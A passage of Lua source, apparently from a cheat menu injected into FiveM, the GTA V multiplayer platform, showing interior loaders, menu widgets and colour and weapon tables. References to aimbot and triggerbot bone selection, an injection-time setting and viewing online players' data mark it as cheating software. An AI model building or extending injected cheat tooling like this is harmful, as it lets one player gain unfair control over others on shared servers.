                        __REAPER1__.F.SetIplPropState(171777, {"swap_mrJam_A", "swap_mrJam_B", "swap_mrJam_C"}, __REAPER1__.A['world:iplloader_unload'].func, false)
                        __REAPER1__.F.SetIplPropState(171777, 'swap_mrJam_A', not __REAPER1__.A['world:iplloader_unload'].func, false)
                        __REAPER1__.N.RefreshInterior(171777)
                    end,
                    franklin = function(p1, p2, p3, p4, p5, p6, p7)
                    end,
                    franklinaunt = function(p1, p2, p3, p4, p5, p6, p7)
                    end,
                    graffiti = function(p1, p2, p3, p4, p5, p6, p7)
                        __REAPER1__.F.EnableIpl({"ch3_rd2_bishopschickengraffiti","cs5_04_mazebillboardgraffiti","cs5_roads_ronoilgraffiti"}, not __REAPER1__.A['world:iplloader_unload'].func)
                    end,
                    lesterfactory = function(p1, p2, p3, p4, p5, p6, p7)
                        __REAPER1__.F.SetIplPropState(92674, 'V_53_Agency_Blueprint', not __REAPER1__.A['world:iplloader_unload'].func, false)
                        __REAPER1__.F.SetIplPropState(92674, 'V_35_KitBag', not __REAPER1__.A['world:iplloader_unload'].func, false)
                        __REAPER1__.F.SetIplPropState(92674, 'V_35_Fireman', not __REAPER1__.A['world:iplloader_unload'].func, false)
                        __REAPER1__.F.SetIplPropState(92674, 'V_35_Body_Armour', not __REAPER1__.A['world:iplloader_unload'].func, false)
                        __REAPER1__.F.SetIplPropState(92674, 'Jewel_Gasmasks', not __REAPER1__.A['world:iplloader_unload'].func, false)
                        __REAPER1__.F.SetIplPropState(92674, 'v_53_agency _overalls', not __REAPER1__.A['world:iplloader_unload'].func, false)
                        __REAPER1__.N.RefreshInterior(LesterFactory.interiorId)
                    end,
                    michael = function(p1, p2, p3, p4, p5, p6, p7)
                    end,
                    northyankton = function(p1, p2, p3, p4, p5, p6, p7)
                        __REAPER1__.F.EnableIpl({"prologue01","prologue01c","prologue01d","prologue01e","prologue01f","prologue01g","prologue01h","prologue01i","prologue01j","prologue01k","prologue01z","prologue02","prologue03","prologue03b","prologue04","prologue04b","prologue05","prologue05b","prologue06","prologue06b","prologue06_int","prologuerd","prologuerdb","prologue_DistantLights","prologue_LODLights","prologue_m2_door"}, not __REAPER1__.A['world:iplloader_unload'].func)
                    end,
                    pillboxhospital = function(p1, p2, p3, p4, p5, p6, p7)
                        __REAPER1__.F.EnableIpl('rc12b_default', not __REAPER1__.A['world:iplloader_unload'].func)
                    end,
                    redcarpet = function(p1, p2, p3, p4, p5, p6, p7)
                        __REAPER1__.F.EnableIpl('redCarpet', not __REAPER1__.A['world:iplloader_unload'].func)
                    end,
                    simeon = function(p1, p2, p3, p4, p5, p6, p7)
                        
                    end,
                    stripclub = function(p1, p2, p3, p4, p5, p6, p7)
                        __REAPER1__.F.SetIplPropState(197121, 'V_19_Trevor_Mess', not __REAPER1__.A['world:iplloader_unload'].func, true) 
                    end,
                    trevorstrailer = function(p1, p2, p3, p4, p5, p6, p7)
                        
                    end,
                    ufo = function(p1, p2, p3, p4, p5, p6, p7)
                        __REAPER1__.F.EnableIpl('ufo', not __REAPER1__.A['world:iplloader_unload'].func)
                        __REAPER1__.F.EnableIpl('ufo_eye', not __REAPER1__.A['world:iplloader_unload'].func)
                        __REAPER1__.F.EnableIpl('ufo_lod', not __REAPER1__.A['world:iplloader_unload'].func)
                    end,
                    zancudogates = function(p1, p2, p3, p4, p5, p6, p7)
                        __REAPER1__.F.EnableIpl("CS3_07_MPGates", not __REAPER1__.A['world:iplloader_unload'].func)
                    end,
                },
                online = {
                    apartment1 = function(p1, p2, p3, p4, p5, p6, p7)
                        __REAPER1__.F.SetIplPropState(141313, {"Apart_Hi_Strip_A", "Apart_Hi_Strip_B", "Apart_Hi_Strip_C"}, not __REAPER1__.A['world:iplloader_unload'].func, false)
                        __REAPER1__.F.SetIplPropState(141313, {"Apart_Hi_Booze_A", "Apart_Hi_Booze_B", "Apart_Hi_Booze_C"}, not __REAPER1__.A['world:iplloader_unload'].func, false)
                        __REAPER1__.F.SetIplPropState(141313, {"Apart_Hi_Smokes_A", "Apart_Hi_Smokes_B", "Apart_Hi_Smokes_C"}, not __REAPER1__.A['world:iplloader_unload'].func, false)
                        __REAPER1__.F.RefreshInterior(141313)
                    end,
                    apartment2 = function(p1, p2, p3, p4, p5, p6, p7)
                        __REAPER1__.F.SetIplPropState(145665, {"Apart_Hi_Strip_A", "Apart_Hi_Strip_B", "Apart_Hi_Strip_C"}, not __REAPER1__.A['world:iplloader_unload'].func, false)
                        __REAPER1__.F.SetIplPropState(145665, {"Apart_Hi_Booze_A", "Apart_Hi_Booze_B", "Apart_Hi_Booze_C"}, not __REAPER1__.A['world:iplloader_unload'].func, false)
                        __REAPER1__.F.SetIplPropState(145665, {"Apart_Hi_Smokes_A", "Apart_Hi_Smokes_B", "Apart_Hi_Smokes_C"}, not __REAPER1__.A['world:iplloader_unload'].func, false)
                        __REAPER1__.F.RefreshInterior(145665)
                    end,
                    house1 = function(p1, p2, p3, p4, p5, p6, p7)
                        __REAPER1__.F.SetIplPropState(207105, {"Apart_Hi_Strip_A", "Apart_Hi_Strip_B", "Apart_Hi_Strip_C"}, not __REAPER1__.A['world:iplloader_unload'].func, false)
                        __REAPER1__.F.SetIplPropState(207105, {"Apart_Hi_Booze_A", "Apart_Hi_Booze_B", "Apart_Hi_Booze_C"}, not __REAPER1__.A['world:iplloader_unload'].func, false)
                        __REAPER1__.F.SetIplPropState(207105, {"Apart_Hi_Smokes_A", "Apart_Hi_Smokes_B", "Apart_Hi_Smokes_C"}, not __REAPER1__.A['world:iplloader_unload'].func, false)
                        __REAPER1__.F.RefreshInterior(207105)
                    end,
                    house2 = function(p1, p2, p3, p4, p5, p6, p7)
                        __REAPER1__.F.SetIplPropState(206081, {"Apart_Hi_Strip_A", "Apart_Hi_Strip_B", "Apart_Hi_Strip_C"}, not __REAPER1__.A['world:iplloader_unload'].func, false)
                        __REAPER1__.F.SetIplPropState(206081, {"Apart_Hi_Booze_A", "Apart_Hi_Booze_B", "Apart_Hi_Booze_C"}, not __REAPER1__.A['world:iplloader_unload'].func, false)
                        __REAPER1__.F.SetIplPropState(206081, {"Apart_Hi_Smokes_A", "Apart_Hi_Smokes_B", "Apart_Hi_Smokes_C"}, not __REAPER1__.A['world:iplloader_unload'].func, false)
                        __REAPER1__.F.RefreshInterior(206081)
                    end,
                    house3 = function(p1, p2, p3, p4, p5, p6, p7)
                        __REAPER1__.F.SetIplPropState(206337, {"Apart_Hi_Strip_A", "Apart_Hi_Strip_B", "Apart_Hi_Strip_C"}, not __REAPER1__.A['world:iplloader_unload'].func, false)
                        __REAPER1__.F.SetIplPropState(206337, {"Apart_Hi_Booze_A", "Apart_Hi_Booze_B", "Apart_Hi_Booze_C"}, not __REAPER1__.A['world:iplloader_unload'].func, false)
                        __REAPER1__.F.SetIplPropState(206337, {"Apart_Hi_Smokes_A", "Apart_Hi_Smokes_B", "Apart_Hi_Smokes_C"}, not __REAPER1__.A['world:iplloader_unload'].func, false)
                        __REAPER1__.F.RefreshInterior(206337)
                    end,
                    house4 = function(p1, p2, p3, p4, p5, p6, p7)
                        __REAPER1__.F.SetIplPropState(208129, {"Apart_Hi_Strip_A", "Apart_Hi_Strip_B", "Apart_Hi_Strip_C"}, not __REAPER1__.A['world:iplloader_unload'].func, false)
                        __REAPER1__.F.SetIplPropState(208129, {"Apart_Hi_Booze_A", "Apart_Hi_Booze_B", "Apart_Hi_Booze_C"}, not __REAPER1__.A['world:iplloader_unload'].func, false)
                        __REAPER1__.F.SetIplPropState(208129, {"Apart_Hi_Smokes_A", "Apart_Hi_Smokes_B", "Apart_Hi_Smokes_C"}, not __REAPER1__.A['world:iplloader_unload'].func, false)
                        __REAPER1__.F.RefreshInterior(208129)
                    end,
                    house5 = function(p1, p2, p3, p4, p5, p6, p7)
                        __REAPER1__.F.SetIplPropState(207617, {"Apart_Hi_Strip_A", "Apart_Hi_Strip_B", "Apart_Hi_Strip_C"}, not __REAPER1__.A['world:iplloader_unload'].func, false)
                        __REAPER1__.F.SetIplPropState(207617, {"Apart_Hi_Booze_A", "Apart_Hi_Booze_B", "Apart_Hi_Booze_C"}, not __REAPER1__.A['world:iplloader_unload'].func, false)
                        __REAPER1__.F.SetIplPropState(207617, {"Apart_Hi_Smokes_A", "Apart_Hi_Smokes_B", "Apart_Hi_Smokes_C"}, not __REAPER1__.A['world:iplloader_unload'].func, false)
                        __REAPER1__.F.RefreshInterior(207617)
                    end,
                    house6 = function(p1, p2, p3, p4, p5, p6, p7)
                        __REAPER1__.F.SetIplPropState(207361, {"Apart_Hi_Strip_A", "Apart_Hi_Strip_B", "Apart_Hi_Strip_C"}, not __REAPER1__.A['world:iplloader_unload'].func, false)
                        __REAPER1__.F.SetIplPropState(207361, {"Apart_Hi_Booze_A", "Apart_Hi_Booze_B", "Apart_Hi_Booze_C"}, not __REAPER1__.A['world:iplloader_unload'].func, false)
                        __REAPER1__.F.SetIplPropState(207361, {"Apart_Hi_Smokes_A", "Apart_Hi_Smokes_B", "Apart_Hi_Smokes_C"}, not __REAPER1__.A['world:iplloader_unload'].func, false)
                        __REAPER1__.F.RefreshInterior(207361)
                    end,
                    house7 = function(p1, p2, p3, p4, p5, p6, p7)
                        __REAPER1__.F.SetIplPropState(206593, {"Apart_Hi_Strip_A", "Apart_Hi_Strip_B", "Apart_Hi_Strip_C"}, not __REAPER1__.A['world:iplloader_unload'].func, false)
                        __REAPER1__.F.SetIplPropState(206593, {"Apart_Hi_Booze_A", "Apart_Hi_Booze_B", "Apart_Hi_Booze_C"}, not __REAPER1__.A['world:iplloader_unload'].func, false)
                        __REAPER1__.F.SetIplPropState(206593, {"Apart_Hi_Smokes_A", "Apart_Hi_Smokes_B", "Apart_Hi_Smokes_C"}, not __REAPER1__.A['world:iplloader_unload'].func, false)
                        __REAPER1__.F.RefreshInterior(206593)
                    end,
                    house8 = function(p1, p2, p3, p4, p5, p6, p7)
                        __REAPER1__.F.SetIplPropState(208385, {"Apart_Hi_Strip_A", "Apart_Hi_Strip_B", "Apart_Hi_Strip_C"}, not __REAPER1__.A['world:iplloader_unload'].func, false)
                        __REAPER1__.F.SetIplPropState(208385, {"Apart_Hi_Booze_A", "Apart_Hi_Booze_B", "Apart_Hi_Booze_C"}, not __REAPER1__.A['world:iplloader_unload'].func, false)
                        __REAPER1__.F.SetIplPropState(208385, {"Apart_Hi_Smokes_A", "Apart_Hi_Smokes_B", "Apart_Hi_Smokes_C"}, not __REAPER1__.A['world:iplloader_unload'].func, false)
                        __REAPER1__.F.RefreshInterior(208385)
                    end,
                    houselow1 = function(p1, p2, p3, p4, p5, p6, p7)
                    end,
                    housemid1 = function(p1, p2, p3, p4, p5, p6, p7)
                    end,
                },
                afterhours = {
                    nightclubs = function(p1, p2, p3, p4, p5, p6, p7)
                    end,
                },
            },
        },
    }

    __REAPER1__.M.Menu_Button = function(p1, p2, p3, p4, p5, p6, p7)
        __REAPER1__.F.PageHandler(p1, 'submenu', p2, p3, p4, p5, p6)
        if __REAPER1__.M.Options == __REAPER1__.M.SelectedOption then
            __REAPER1__.M.Submenu = p7

            if __REAPER1__.M.CurrentMenu == 'weapon:editor' and __REAPER1__.M.ImageUrl ~= __REAPER1__.T.WeaponsImages[p1] then
                __REAPER1__.M.ImageUrl = __REAPER1__.T.WeaponsImages[p1]
                __REAPER1__.N.SetDuiUrl(__REAPER1__.M.WeaponImage, __REAPER1__.M.ImageUrl)
            elseif __REAPER1__.M.CurrentMenu == 'server:onlineplayers' and __REAPER1__.A['settings_playerdata'].func then
                __REAPER1__.F.DrawPlayerData(p2)
            end
        end
    end

    __REAPER1__.M.Button = function(p1, p2, p3, p4, p5, p6)
        __REAPER1__.F.PageHandler(p1, 'button', p2, p3, p4, p5, p6)
        if __REAPER1__.M.EnterKey and __REAPER1__.M.Options == __REAPER1__.M.SelectedOption then
            __REAPER1__.M.EnterKey = false
            __REAPER1__.N.PlaySound('def', -1, 'SELECT', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
            return true
        end
    end

    __REAPER1__.M.Checkbox = function(p1, p2, p3, p4, p5, p6, p7)
        __REAPER1__.F.PageHandler(p1, 'checkbox', p2, p3, p4, p5, p6, p7)
        if __REAPER1__.M.EnterKey and __REAPER1__.M.Options == __REAPER1__.M.SelectedOption then
            __REAPER1__.M.EnterKey = false
            __REAPER1__.N.PlaySound('def', -1, 'SELECT', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
            return 'checkbox'
        end
    end

    __REAPER1__.M.Combo = function(p1, p2, p3, p4, p5, p6, p7, p8, p9, p10, p11, p12, p13)
        __REAPER1__.F.PageHandler(p1, 'combo', p2, p3, p4, p5, p6, #p7 == 1 and p7[p8] or p8 == 1 and p7[p8] .. __REAPER1__.F.RightArrow or p8 == #p7 and __REAPER1__.F.LeftArrow .. p7[p8] or __REAPER1__.F.LeftArrow .. p7[p8] .. __REAPER1__.F.RightArrow, p10, #p7, p8)
        if __REAPER1__.M.Options == __REAPER1__.M.SelectedOption then
            if p6 == 'image_weapon' and __REAPER1__.M.ImageUrl ~= __REAPER1__.T.WeaponsImages[p7[p8]] then
                __REAPER1__.M.ImageUrl = __REAPER1__.T.WeaponsImages[p7[p8]]
                __REAPER1__.N.SetDuiUrl(__REAPER1__.M.WeaponImage, __REAPER1__.M.ImageUrl)
            elseif p6 == 'image_model' and __REAPER1__.M.ImageUrl ~= 'https://docs.fivem.net/peds/' .. p7[p8] .. '.webp' then
                __REAPER1__.M.ImageUrl = 'https://docs.fivem.net/peds/' .. p7[p8] .. '.webp'
                __REAPER1__.N.SetDuiUrl(__REAPER1__.M.ModelImage, __REAPER1__.M.ImageUrl)
            elseif p6 == 'image_vehicle' and __REAPER1__.M.ImageUrl ~= __REAPER1__.T.VehiclesImages[p7[p8]] then
                __REAPER1__.M.ImageUrl = __REAPER1__.T.VehiclesImages[p7[p8]]
                __REAPER1__.N.SetDuiUrl(__REAPER1__.M.VehicleImage, __REAPER1__.M.ImageUrl)
            end

            if __REAPER1__.N.IsDisabledControlPressed(0, 175) and p8 ~= #p7 and (__REAPER1__.M.SwitchWait or 0 ) <= __REAPER1__.N.GetGameTimer() then
                __REAPER1__.M.SwitchWait = __REAPER1__.N.GetGameTimer() + __REAPER1__.A['settings_switchspeed'].sindex
                __REAPER1__.N.PlaySound('def', -1, "NAV_LEFT_RIGHT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
                local rtype = p10 == true and 'combotoggle' or 'combo'
                if __REAPER1__.A['settings_comboiswitch'].func and p10 == nil then
                    __REAPER1__.M.EnterKey, p8 = true, p8 + 1
                    __REAPER1__.A[p2].cindex = p8
                else
                    return rtype, p8 + 1, p9
                end
            elseif __REAPER1__.N.IsDisabledControlPressed(0, 174) and p8 ~= 1 and (__REAPER1__.M.SwitchWait or 0) <= __REAPER1__.N.GetGameTimer() then
                __REAPER1__.M.SwitchWait = __REAPER1__.N.GetGameTimer() + __REAPER1__.A['settings_switchspeed'].sindex
                __REAPER1__.N.PlaySound('def', -1, "NAV_LEFT_RIGHT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
                local rtype = p10 == true and 'combotoggle' or 'combo'
                if __REAPER1__.A['settings_comboiswitch'].func and p10 == nil then
                    __REAPER1__.M.EnterKey, p8 = true, p8 - 1
                    __REAPER1__.A[p2].cindex = p8
                else
                    return rtype, p8 - 1, p9
                end
            elseif __REAPER1__.N.IsKeyReleased(__REAPER1__.A['settings_textbox'].extra) then
                __REAPER25__(function()
                    __REAPER1__.F.TextBox(p7[p8], p2, 'combo', p11, p12, p13)
                end)
            end

            if __REAPER1__.M.EnterKey then
                __REAPER1__.M.EnterKey = false
                __REAPER1__.N.PlaySound('def', -1, 'SELECT', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
                return 'comboactive', p8, p8
            end
        end

        if p6 == 'image_aimbot_bone' and __REAPER1__.M.ImageUrl ~= __REAPER1__.T.BonetagImages[p8] then
            __REAPER1__.M.ImageUrl = __REAPER1__.T.BonetagImages[p8]
            __REAPER1__.N.SetDuiUrl(__REAPER1__.M.BonetagImage, __REAPER1__.M.ImageUrl)
        elseif p10 and p6 == 'image_triggerbot_bone' and __REAPER1__.M.ImageUrl ~= __REAPER1__.T.TriggerbotImages[p8] then
            __REAPER1__.M.ImageUrl = __REAPER1__.T.TriggerbotImages[p8]
            __REAPER1__.N.SetDuiUrl(__REAPER1__.M.BonetagImage, __REAPER1__.M.ImageUrl)
        end
    end

    __REAPER1__.M.Separator = function(p1, p2, p3, p4, p5)
        __REAPER1__.F.PageHandler(p1, 'separator', p2, p3, p4, p5)
        if __REAPER1__.M.Options == __REAPER1__.M.SelectedOption + 1 then
            __REAPER1__.M.SepaBoolPlusz = true
        elseif __REAPER1__.M.Options == __REAPER1__.M.SelectedOption - 1 then
            __REAPER1__.M.SepaBoolMinusz = true
        end
    end

    __REAPER1__.M.Button_Textbox = function(p1, p2, p3, p4, p5, p6, p7, p8, p9, p10, p11, p12, p13)
        __REAPER1__.F.PageHandler(p1, 'buttontextbox', p2, p3, p4, p5, p6, p7)
        if __REAPER1__.M.Options == __REAPER1__.M.SelectedOption then
            if __REAPER1__.N.IsKeyReleased(__REAPER1__.A['settings_textbox'].extra) and p2 ~= "settings_injectiontime" and p2 ~= "settings_overallcommands" then
                __REAPER25__(function()
                    __REAPER1__.F.TextBox(p7, p2, 'buttontextb', p11, p12, p13)
                end)
            elseif __REAPER1__.M.EnterKey then
                __REAPER1__.M.EnterKey = false
                __REAPER1__.N.PlaySound('def', -1, 'SELECT', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
                return true
            end
        end
    end

    __REAPER1__.T.BlipColor = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85}
    __REAPER1__.T.AlphaValues = {255, 204, 102, 51, 0}
    __REAPER1__.T.VehMatte = {'Matte Black', 'Matte Gray', 'Matte Light Grey', 'Matte Red', 'Matte Dark Red', 'Matte Orange', 'Matte Yellow', 'Matte Lime Green', 'Matte Dark Blue', 'Matte Blue', 'Matte Midnight Blue', 'Matte Green', 'Matte Brown', 'Matte White', 'Matte Purple', 'Matte Dark Purple', 'Matte Forest Green', 'Matte Olive Drab', 'Matte Desert Brown', 'Matte Desert Tan', 'Matte Foilage Green'}
    __REAPER1__.T.VehPearl = {'Worn Black', 'Worn Graphite', 'Worn Silver Grey', 'Worn Silver', 'Worn Blue Silver', 'Worn Shadow Silver', 'Worn Red', 'Worn Golden Red', 'Worn Dark Red', 'Worn Dark Green', 'Worn Green', 'Worn Sea Wash', ' Worn Dark Blue', 'Worn Blue', 'Worn Light Blue', 'Worn Honey Beige', 'Worn Brown', 'Worn Dark Brown', 'Worn Straw Beige', 'Worn Off White', 'Worn Orange', 'Worn Light Orange', 'Worn Taxi Yellow', 'Worn White', 'Worn Olive Army Green'}
    __REAPER1__.T.VehNormal = {'Pure White', 'Hot Pink', 'Salmon Pink', 'Orange', 'Green', 'Blue', 'Hunter Green', 'Police Car Blue', 'Modshop Black1', 'Default Alloy Color', 'Epsilon Blue', 'Pure Gold', 'Brushed Gold', 'Util Black', 'Util Black Poly', 'Util Dark Silver', 'Util Silver', 'Util Gun Metal', 'Util Shadow Silver', 'Util Red', 'Util Bright Red', 'Util Garnet Red', 'Util Dark Green', 'Util Green', 'Util Dark Blue', 'Util Midnight Blue', 'Util Blue', 'Util Sea Foam Blue', 'Util Lightning Blue', 'Util Maui Blue Poly', 'Util Bright Blue', 'Util Brown', 'Util Medium Brown', 'Util Light Brown', 'Util Off White'}
    __REAPER1__.T.VehMetalic = {'Metallic Black', 'Metallic Graphite Black', 'Metallic Black Steal', 'Metallic Dark Silver', 'Metallic Steel Gray', 'Metallic Shadow Silver', 'Metallic Stone Silver', 'Metallic Midnight Silver', 'Metallic Gun Metal', 'Metallic Anthracite Grey', 'Metallic Red', 'Metallic Torino Red', 'Metallic Formula Red', 'Metallic Blaze Red', 'Metallic Graceful Red', 'Metallic Garnet Red', 'Metallic Desert Red', 'Metallic Cabernet Red', 'Metallic Candy Red', 'Metallic Sunrise Orange', 'Metallic Classic Gold', 'Metallic Orange', 'Metallic Dark Green', 'Metallic Racing Green', 'Metallic Sea Green', 'Metallic Olive Green', 'Metallic Green', 'Metallic Gasoline Blue Green', 'Metallic Midnight Blue', 'Metallic Dark Blue', 'Metallic Saxony Blue', 'Metallic Blue', 'Metallic Mariner Blue', 'Metallic Harbor Blue', 'Metallic Diamond Blue', 'Metallic Surf Blue', 'Metallic Nautical Blue', 'Metallic Bright Blue', 'Metallic Purple Blue', 'Metallic Spinnaker Blue', 'Metallic Ultra Blue', 'Metallic Bright Blue', 'Metallic Taxi Yellow', 'Metallic Race Yellow', 'Metallic Bronze', 'Metallic Yellow Bird', 'Metallic Lime', 'Metallic Champagne', 'Metallic Pueblo Beige', 'Metallic Dark Ivory', 'Metallic Choco Brown', 'Metallic Golden Brown', 'Metallic Light Brown', 'Metallic Straw Beige', 'Metallic Moss Brown', 'Metallic Biston Brown', 'Metallic Beechwood', 'Metallic Dark Beechwood', 'Metallic Choco Orange', 'Metallic Beach Sand', 'Metallic Sun Bleeched Sand', 'Metallic Cream', 'Metallic White', 'Metallic Frost White', 'Metallic Securicor Green', 'Metallic Vermillion Pink', 'Mettalic Black Blue', 'Metallic Black Purple', 'Metallic Black Red', 'Metallic Purple', 'Metaillic V Dark Blue', 'Metallic Lava Red'}
    __REAPER1__.T.Alpha = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255}
    __REAPER1__.T.BlipTypes = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 490, 491, 492, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 635, 636, 637, 638, 639, 640, 641, 642, 643, 644, 645, 646, 647, 648, 649, 650, 651, 652, 653, 654, 655, 656, 657, 658, 659, 660, 661, 662, 663, 664, 665, 666, 667, 668, 669}
    __REAPER1__.T.MParticles = {'Firework', 'Firework 2', 'Beast appear', 'Clown trails', 'Clown', 'Clown 2', 'Clown 3', 'Explosion', 'Smoke', 'Alien', 'Alien 2', 'Blood', 'Blood 2', 'Water', 'Electrical', 'Dirt'}
    __REAPER1__.T.WeaponsNoMelee = {"Pistol", "Pistol_MK2", "Combatpistol", "Appistol", "Stungun", "Pistol50", "Snspistol", "Snspistol_MK2", "Heavypistol", "Vintagepistol", "Flaregun", "Marksmanpistol", "Revolver", "Revolver_MK2", "Doubleaction", "Raypistol", "Ceramicpistol", "Navyrevolver", "Microsmg", "Smg", "Smg_MK2", "Assaultsmg", "Combatpdw", "Machinepistol", "Minismg", "Raycarbine", "Pumpshotgun", "Pumpshotgun_MK2", "Sawnoffshotgun", "Assaultshotgun", "Bullpupshotgun", "Musket", "Heavyshotgun", "Dbshotgun", "Autoshotgun", "Assaultrifle", "Assaultrifle_MK2", "Carbinerifle", "Carbinerifle_MK2", "Advancedrifle", "Specialcarbine", "Specialcarbine_MK2", "Bullpuprifle", "Bullpuprifle_MK2", "Compactrifle", "Mg", "Combatmg", "Combatmg_MK2", "Gusenberg", "Sniperrifle", "Heavysniper", "Heavysniper_MK2", "Marksmanrifle", "Marksmanrifle_MK2", "RPG", "Grenadelauncher", "Minigun", "Firework", "Railgun", "Hominglauncher", "Compactlauncher", "Rayminigun", "Grenade", "Bzgas", "Molotov", "Stickybomb", "Proxmine", "Snowball", "Pipebomb", "Ball", "Smokegrenade", "Flare"}
    __REAPER1__.T.VehicleDoors = {'Front left', 'Front right', 'Back left', 'Back right', 'Hood', 'Trunk', 'Back', 'Back2'}
